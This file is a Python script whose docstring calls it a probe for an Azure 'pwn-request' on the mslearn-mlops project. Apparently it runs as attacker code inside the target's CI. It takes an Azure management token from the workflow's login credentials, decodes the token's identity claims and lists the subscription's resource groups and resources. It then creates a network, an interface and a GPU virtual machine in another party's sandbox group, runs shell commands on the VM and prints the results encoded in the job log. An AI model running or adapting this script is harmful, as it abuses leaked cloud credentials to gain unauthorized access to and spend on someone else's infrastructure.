#!/usr/bin/env python3
"""C211 i120447 probe v6 (mslearn-mlops Azure pwn-request, continuation of i120316):
- ARM token via azure/login static creds
- list ALL resources in chriso-sandbox-rg first (independent leak check for the v5 run)
- pre-clean any leftover c211-i120316-* / c211-i120447-* VM/NIC/vnet with 404 readback
- pick the single fitting NV4as_v4 (standardNVSv4Family quota 4) in a normal region
- create vnet+subnet in the EXISTING RG, wait for Succeeded, retry NIC/VM on 429
- deploy EXACTLY ONE nonce-tagged on-demand VM, capture GPU device proof via runCommand
  (lspci/DRM ids/nvidia-smi/rocm-smi), independent ARM readback (VM get + list + tag filter)
- teardown VM/NIC/vnet and prove absence
- INCREMENTAL progress markers on every step (v5 died in emit() after the work and lost all output)
"""
import argparse, base64, json, os, random, re, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse

INTENT = 'i120447'
def p(*a): print(*a, flush=True)
def prog(step, **kw):
    try: p('C211_%s_PROGRESS ' % INTENT + json.dumps({'step': step, 't': time.strftime('%FT%TZ', time.gmtime()), **kw})[:3500])
    except Exception as e: p('C211_%s_PROGRESS_ERR ' % INTENT + repr(e))
def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'cmd': cmd, 'rc': r.returncode, 'out': r.stdout[-4000:], 'err': r.stderr[-1500:]}
    except Exception as e: return {'cmd': cmd, 'rc': -1, 'err': repr(e)}
def jget(tok, url):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=60) as r: return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read() or b'{}')
        except Exception: return e.code, {'error': 'http'}
    except Exception as e: return -1, {'error': repr(e)}
def jcall(tok, method, url, body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={'Authorization': 'Bearer ' + tok,
        'User-Agent': 'c211-' + INTENT, 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try: return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception: return r.status, {'raw': raw[:800].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try: b = json.loads(e.read() or b'{}')
        except Exception: b = {'error': 'http'}
        return e.code, b, dict(e.headers)
    except Exception as e: return -1, {'error': repr(e)}, {}

ARM = 'https://management.azure.com'
PREFIXES = ('c211-i120316-', 'c211-i120447-')

def list_rg_resources(tok, sub, RG):
    st, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    if st != 200: return {'status': st, 'resp': rs}
    items = [{'name': r.get('name'), 'type': r.get('type'), 'loc': r.get('location')} for r in (rs.get('value') or [])]
    ours = [x for x in items if any(str(x['name']).startswith(pre) for pre in PREFIXES)]
    return {'status': 200, 'count': len(items), 'all_names': [x['name'] for x in items], 'ours': ours}

def delete_and_wait(tok, url, check_url):
    sd, rd, _ = jcall(tok, 'DELETE', url)
    last = None
    for i in range(50):
        time.sleep(4)
        last, _ = jget(tok, check_url)
        if last == 404: break
    return {'delete': sd, 'absence': last}

def preclean(tok, sub, RG, R):
    """Delete any leftover resource of ours (VM first, then NIC, then vnet) with 404 readback."""
    R['preclean'] = []
    st0, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    items = [{'name': r.get('name'), 'type': (r.get('type') or '')} for r in (rs.get('value') or [])] if st0 == 200 else []
    ours = [x for x in items if any(str(x['name']).startswith(pre) for pre in PREFIXES)]
    prog('preclean_found', status=st0, ours=ours)
    order = ['Microsoft.Compute/virtualMachines', 'Microsoft.Network/networkInterfaces',
             'Microsoft.Network/virtualNetworks', 'Microsoft.Compute/disks']
    for typ in order:
        for x in [y for y in ours if y['type'] == typ]:
            t = typ.split('/')[-1]
            url = f"{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/{typ}/{x['name']}?api-version=" + ('2024-07-01' if t == 'virtualMachines' else '2024-01-01')
            d = delete_and_wait(tok, url, url.split('?')[0] + '?api-version=' + ('2024-07-01' if t == 'virtualMachines' else '2024-01-01'))
            d.update({'name': x['name'], 'type': typ})
            R['preclean'].append(d)
            prog('preclean_deleted', **d)
    st1, rs1 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    left = [r.get('name') for r in (rs1.get('value') or []) if any(str(r.get('name')).startswith(pre) for pre in PREFIXES)] if st1 == 200 else rs1
    R['preclean_after'] = {'status': st1, 'left': left}
    prog('preclean_after', status=st1, left=left)

def main():
    ap = argparse.ArgumentParser(); ap.parse_known_args()
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': INTENT}
    tokr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tokr['out']); tok = td.get('accessToken'); R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '==='))
    except Exception as e:
        R['token_parse_error'] = repr(e)
    R['token_rc'] = tokr['rc']
    prog('token', rc=tokr['rc'], exp=R.get('token_expiresOn'),
         oid=(R.get('token_claims') or {}).get('oid'), appid=(R.get('token_claims') or {}).get('appid'),
         tid=(R.get('token_claims') or {}).get('tid'))
    if not tok:
        R['fatal'] = 'no ARM token'; emit(R); return
    st, subs = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions_status'] = st
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'), 'name': s.get('displayName')}
                          for s in (subs.get('value') or [])]
    sub = (R['subscriptions'][0]['id'] if R['subscriptions'] else os.environ.get('AZURE_SUBSCRIPTION_ID'))
    R['sub'] = sub
    st, rgs = jget(tok, f'{ARM}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01')
    R['rg_status'] = st
    R['rg_names'] = [g['name'] for g in (rgs.get('value') or [])] if st == 200 else rgs
    RG = next((n for n in R['rg_names'] if n.lower().startswith('chriso-sandbox-rg')), None) if isinstance(R['rg_names'], list) else None
    R['rg'] = RG
    prog('enumerated', subs=R['subscriptions'], rgs=R['rg_names'], rg=RG)
    if not RG:
        R['fatal'] = 'no chriso-sandbox-rg'; emit(R); return
    R['rg_resources_before'] = list_rg_resources(tok, sub, RG)
    prog('rg_resources_before', **{k: R['rg_resources_before'][k] for k in ('status', 'count', 'ours')})
    # ---- pre-clean leftovers (v5 may have leaked; also cleans any earlier attempt) ----
    preclean(tok, sub, RG, R)
    # ---- SKU catalog: ONE call, client-side location filter ----
    sts, cat = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01')
    R['sku_catalog_status'] = sts
    R['sku_catalog_count'] = len(cat.get('value') or []) if sts == 200 else 0
    GPU_RE = re.compile(r'^Standard_(NC|ND|NV)')
    skus = []
    for s in (cat.get('value') or []):
        nm = s.get('name', '')
        if not GPU_RE.match(nm): continue
        if [r for r in (s.get('restrictions') or []) if r.get('type') == 'Location']: continue
        caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
        try: vc = int(caps.get('vCPUs') or 999)
        except Exception: vc = 999
        zrestr = [r for r in (s.get('restrictions') or []) if r.get('type') == 'Zone']
        zones = []
        for r in zrestr:
            for z in ((r.get('restrictionInfo') or {}).get('zones') or []):
                if z not in zones: zones.append(z)
        skus.append({'sku': nm, 'family': s.get('family'), 'vcpus': vc, 'gpus': caps.get('GPUs'),
                     'gpu_name': caps.get('GPU'), 'locs': s.get('locations') or [], 'zones': zones})
    R['gpu_skus_offered'] = len(skus)
    pref_regions = ['westeurope', 'northeurope', 'westus2', 'southeastasia', 'canadacentral', 'eastus', 'eastus2']
    qmap = {}
    for reg in pref_regions:
        stu, us = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/usages?api-version=2024-07-01')
        if stu != 200:
            qmap[reg] = {'status': stu}; continue
        fam = {}
        for u in us.get('value') or []:
            nm = ((u.get('name') or {}).get('value') or '')
            if re.match(r'(?i)^standard(NC|ND|NV)', nm):
                fam[nm.lower()] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0)}
        qmap[reg] = {'status': 200, 'gpu_families': fam}
        time.sleep(0.3)
    R['quota'] = qmap
    def fam_key(f):
        f2 = (f or '').lower().replace(' ', '').replace('_', '')
        f2 = re.sub(r'^standard', '', f2); f2 = re.sub(r'family$', '', f2)
        return f2
    cands = []
    for s in skus:
        for reg in pref_regions:
            if not any(l.lower().replace(' ', '') == reg for l in s['locs']): continue
            q = qmap.get(reg, {})
            if q.get('status') != 200: continue
            avail = None
            for qf, qv in q['gpu_families'].items():
                if fam_key(qf) == fam_key(s['family']):
                    avail = qv['limit'] - qv['current']; break
            if avail is None or s['vcpus'] > avail: continue
            score = (0 if s['sku'] == 'Standard_NV4as_v4' else 1, pref_regions.index(reg), s['vcpus'])
            cands.append((score, reg, s, avail))
    cands.sort(key=lambda x: x[0])
    R['sel_candidates'] = [{'region': c[1], 'sku': c[2]['sku'], 'family': c[2]['family'], 'vcpus': c[2]['vcpus'],
                            'gpus': c[2]['gpus'], 'gpu_name': c[2]['gpu_name'], 'avail': c[3]} for c in cands[:12]]
    prog('selection', sel_candidates=R['sel_candidates'])
    marker = {'attempted': False}; R['marker'] = marker
    nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    marker['nonce'] = nonce
    attempts = []
    R['attempts'] = attempts
    # image fallback: gen1 first (max compatibility), gen2 only if ARM refuses the image
    IMAGES = [{'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts', 'version': 'latest'},
              {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'}]
    dev_evidence = None
    for score, region, sinfo, avail in cands[:3]:
        sku = sinfo['sku']
        pre = 'c211-' + INTENT + '-' + nonce
        vnet = pre + '-' + region + '-vnet'; sn = pre + '-' + region + '-subnet'; nic = pre + '-' + region + '-nic'; vm = pre + '-' + region + '-vm'
        att = {'region': region, 'sku': sku, 'avail': avail, 'sku_zones': sinfo.get('zones'), 'steps': {}}
        attempts.append(att)
        marker.update({'attempted': True, 'region': region, 'sku': sku, 'gpu_name': sinfo.get('gpu_name'), 'rg': RG,
                       'names': {'vnet': vnet, 'subnet': sn, 'nic': nic, 'vm': vm, 'region': region}})
        prog('attempt_start', region=region, sku=sku, avail=avail, names=marker['names'])
        # ---- vnet ----
        vb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'addressSpace': {'addressPrefixes': ['10.211.0.0/16']},
                             'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.211.1.0/24'}}]}}
        s1, r1, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01', vb)
        att['steps']['vnet_create'] = {'status': s1, 'id': r1.get('id') if isinstance(r1, dict) else None,
                                       'err': (r1.get('error') or {}) if isinstance(r1, dict) and s1 not in (200, 201) else None}
        prog('vnet_create', status=s1, err=att['steps']['vnet_create']['err'])
        if s1 not in (200, 201):
            continue
        settle = None
        for i in range(36):
            stsv, vs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            props = (vs.get('properties') or {}) if stsv == 200 else {}
            vp = props.get('provisioningState')
            sp = [((sn0.get('properties') or {}).get('provisioningState')) for sn0 in (props.get('subnets') or [])]
            settle = {'vnet': vp, 'subnets': sp, 'status': stsv}
            if stsv == 200 and vp == 'Succeeded' and all(x == 'Succeeded' for x in sp):
                break
            time.sleep(5)
        att['steps']['vnet_settle'] = settle
        prog('vnet_settle', settle=settle)
        subnet_id = f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}/subnets/{sn}'
        nb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
        s2 = None; r2 = None; tries = []
        for i in range(15):
            s2, r2, h2 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nb)
            tries.append({'status': s2, 'retry_after': h2.get('Retry-After'), 'code': ((r2.get('error') or {}).get('code') if isinstance(r2, dict) else None)})
            if s2 in (200, 201): break
            time.sleep(12)
        att['steps']['nic_create'] = {'status': s2, 'tries': tries, 'err': (r2.get('error') or {}) if s2 not in (200, 201) else None}
        prog('nic_create', status=s2, tries=tries)
        if s2 not in (200, 201):
            cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R)
            continue
        # ---- VM (sequential image attempts: only one VM object ever requested at a time) ----
        pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
        s3 = None; r3 = None; vtries = []
        img_used = None
        for im in IMAGES:
            vmb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
                   'properties': {'hardwareProfile': {'vmSize': sku},
                    'storageProfile': {'imageReference': im,
                                       'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
                    'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
                                  'linuxConfiguration': {'disablePasswordAuthentication': False}},
                    'networkProfile': {'networkInterfaces': [{'id': r2.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
            if sinfo.get('zones'):
                vmb['zones'] = [sinfo['zones'][0]]
            s3 = None; r3 = None
            for i in range(12):
                s3, r3, h3 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmb, timeout=180)
                vtries.append({'status': s3, 'image': im['sku'], 'retry_after': h3.get('Retry-After'), 'code': ((r3.get('error') or {}).get('code') if isinstance(r3, dict) else None)})
                if s3 in (200, 201): break
                # only retry on throttling; other errors break to next image
                if s3 != 429: break
                time.sleep(15)
            img_used = im['sku']
            att['steps']['vm_create'] = {'status': s3, 'image': img_used, 'tries': vtries,
                                         'err': (r3.get('error') or {}) if isinstance(r3, dict) and s3 not in (200, 201) else None}
            prog('vm_create', status=s3, image=img_used, tries=vtries, err=att['steps']['vm_create']['err'])
            if s3 in (200, 201): break
            if s3 != 400: break
        if s3 not in (200, 201):
            cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=None, R=R)
            continue
        # ---- provisioning ----
        ok = False; prov = None; ivstat = None
        for i in range(40):
            time.sleep(12)
            stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
            prov = ((g.get('properties') or {}).get('provisioningState'))
            if prov in ('Succeeded', 'Failed'):
                ok = prov == 'Succeeded'; break
        marker['provision_state'] = prov; marker['provisioned'] = ok
        att['steps']['provision_state'] = prov
        ig, inst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01')
        ivstat = [{'code': x.get('code'), 'level': x.get('level'), 'message': (x.get('message') or '')[:600]} for x in ((inst.get('statuses') or []) if ig == 200 else [])]
        marker['instance_view_statuses'] = ivstat
        prog('provision', state=prov, ok=ok, ivstat=ivstat, get_status=ig)
        if ok:
            script = ("echo ---LSPCI---; lspci -nn | grep -i -E 'vga|3d|display|nvidia|amd/ati|processing' ; "
                      "echo ---DRM---; for d in /sys/class/drm/card*/device /sys/class/drm/card*/device/drm/card*; do [ -e \"$d\" ] && { echo DEV=$d; "
                      "cat $d/vendor 2>/dev/null; cat $d/device 2>/dev/null; cat $d/unique_id 2>/dev/null; cat $d/serial 2>/dev/null; echo; }; done; "
                      "echo ---SMI---; (nvidia-smi -L || echo NO_NVIDIA_SMI); echo ---ROCM---; (rocm-smi --showproductname 2>/dev/null || echo NO_ROCM_SMI); "
                      "echo ---MOD---; (lsmod | grep -i -E 'nvidia|amdgpu' || echo NO_GPU_MODULE); echo ---HW---; (lshw -C display 2>/dev/null || true); "
                      "echo ---DMIDECODE---; (dmidecode -s system-product-name 2>/dev/null || true); echo ---UNAME---; uname -r")
            rc_body = {'commandId': 'RunShellScript', 'script': [script]}
            s4, r4, h4 = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', rc_body)
            att['steps']['runcommand_submit'] = {'status': s4}
            prog('runcommand_submit', status=s4)
            pollurl = h4.get('Azure-AsyncOperation') or h4.get('Location') or h4.get('azure-asyncoperation') or h4.get('location')
            marker['runcommand_pollurl_present'] = bool(pollurl)
            captured = None
            if pollurl:
                for i in range(30):
                    time.sleep(8)
                    st5, r5 = jget(tok, pollurl if pollurl.startswith('http') else ARM + pollurl)
                    sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
                    if sval in ('Succeeded', 'Failed'):
                        captured = r5; break
            blob = json.dumps(captured or {})
            msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,6000})"', blob)[:6]
            marker['runcommand_messages'] = [m[:4000] for m in msgs]
            marker['runcommand_status'] = ((captured or {}).get('properties', {}) or {}).get('status') if isinstance(captured, dict) else None
            marker['device_signals'] = [x for x in re.findall(r'(GPU-[0-9a-f-]{16,}|1002:[0-9a-f]{4}|10de:[0-9a-f]{4}|unique_id[^,]{0,80}|MI25|MI50|Radeon[^"\\]{0,60}|NVIDIA[^"\\]{0,60}|Tesla[^"\\]{0,40}|amdgpu|Instinct[^"\\]{0,40})', blob)][:16]
            dev_evidence = {'signals': marker['device_signals'], 'runcommand_status': marker['runcommand_status'],
                            'messages': marker['runcommand_messages'][:2]}
            prog('device_proof', **dev_evidence)
        # ---- independent readback (ARM) ----
        stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
        marker['list_with_marker'] = {'status': stl, 'present': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else lst}
        stt, tagl = jget(tok, f"{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01&$filter=" + urllib.parse.quote("tagName eq 'c211'"))
        marker['tag_readback'] = {'status': stt, 'names': [v.get('name') for v in (tagl.get('value') or [])] if stt == 200 else tagl}
        stget, vget = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
        marker['vm_get'] = {'status': stget, 'name': vget.get('name'), 'size': ((vget.get('properties') or {}).get('hardwareProfile') or {}).get('vmSize'),
                            'tags': vget.get('tags')}
        prog('readback', list=marker['list_with_marker'], tag=marker['tag_readback'], vm_get=marker['vm_get'])
        # ---- teardown ----
        cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=vm, R=R, marker=marker)
        prog('cleanup', cleanup=marker.get('cleanup'))
        if dev_evidence and dev_evidence.get('signals'):
            break
        # if provisioning failed with a capacity-ish error, try the next region; else stop
        capish = any((x.get('code') or '').lower() in ('skunotavailable', 'zonalallocationfailed', 'allocationfailed', 'operationnotallowed')
                     for x in (ivstat or []))
        if ok or not capish:
            break
    R['rg_resources_after'] = list_rg_resources(tok, sub, RG)
    prog('rg_resources_after', **{k: R['rg_resources_after'][k] for k in ('status', 'count', 'ours')})
    marker['device_evidence'] = dev_evidence
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    emit(R)

def cleanup(tok, sub, RG, vnet, nic, vm, R, marker=None):
    C = {}
    if vm:
        std, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
        C['vm_delete_status'] = std
        last = None
        for i in range(50):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
            if last == 404: break
        C['vm_absence_status'] = last
    if nic:
        stn, _, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
        C['nic_delete_status'] = stn
        last = None
        for i in range(20):
            time.sleep(4)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
            if last == 404: break
        C['nic_absence_status'] = last
    if vnet:
        sd = None
        for i in range(20):
            sd, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if sd in (200, 202, 204): break
            time.sleep(8)
        C['vnet_delete_status'] = sd
        last = None
        for i in range(60):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if last == 404: break
        C['vnet_absence_status'] = last
    stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
    C['vnets_after'] = {'status': stv, 'names': [v.get('name') for v in (vn.get('value') or [])] if stv == 200 else vn}
    stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
    C['vms_after'] = {'status': stl, 'names': [v.get('name') for v in (lst.get('value') or [])] if stl == 200 else lst}
    R.setdefault('cleanup', []).append(C)
    if marker is not None: marker['cleanup'] = C

def emit(R):
    try:
        blob = json.dumps(R, default=str)
        b64 = base64.b64encode(blob.encode()).decode()
        def st(v):
            return v.get('status') if isinstance(v, dict) else (str(v)[:120] if v is not None else None)
        summ = {'sub': R.get('sub'), 'rg': R.get('rg'),
                'rg_resources_before': {k: (R.get('rg_resources_before') or {}).get(k) for k in ('status', 'count', 'ours')},
                'preclean': R.get('preclean'), 'preclean_after': R.get('preclean_after'),
                'sku_catalog_count': R.get('sku_catalog_count'), 'gpu_skus_offered': R.get('gpu_skus_offered'),
                'sel_candidates': R.get('sel_candidates'),
                'attempts': [{k: v for k, v in a.items() if k != 'steps'} | {'step_statuses': {kk: st(vv) for kk, vv in (a.get('steps') or {}).items()}}
                             for a in (R.get('attempts') or [])],
                'marker': {k: R.get('marker', {}).get(k) for k in ('attempted', 'nonce', 'region', 'sku', 'gpu_name', 'provision_state', 'provisioned',
                                                                  'instance_view_statuses', 'runcommand_status', 'device_signals', 'device_evidence',
                                                                  'list_with_marker', 'tag_readback', 'vm_get', 'cleanup')},
                'rg_resources_after': {k: (R.get('rg_resources_after') or {}).get(k) for k in ('status', 'count', 'ours')},
                'cleanup': R.get('cleanup')}
        p('C211_%s_SUMMARY ' % INTENT + json.dumps(summ, default=str)[:14000])
        p('C211_%s_RESULT_B64_BEGIN' % INTENT)
        for i in range(0, len(b64), 200): p(b64[i:i+200])
        p('C211_%s_RESULT_B64_END' % INTENT)
    except Exception as e:
        p('C211_%s_EMIT_ERROR ' % INTENT + repr(e))
        try: p('C211_%s_RAW ' % INTENT + json.dumps(R, default=str)[:12000])
        except Exception: pass

if __name__ == '__main__':
    main()
